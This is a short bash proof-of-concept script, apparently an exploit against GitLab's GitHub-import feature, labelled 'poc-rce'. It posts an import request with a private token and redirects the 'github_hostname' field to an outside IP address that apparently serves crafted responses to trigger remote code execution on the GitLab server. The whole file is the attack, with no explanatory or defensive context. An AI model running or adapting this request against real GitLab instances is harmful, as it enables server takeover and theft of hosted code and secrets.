#!/bin/bash

curl "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: $GL_KEY" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "yvvdwf",
    "new_name": "poc-rce-'$(date +%s)'",
    "github_hostname": "http://51.75.74.52:80"
}'

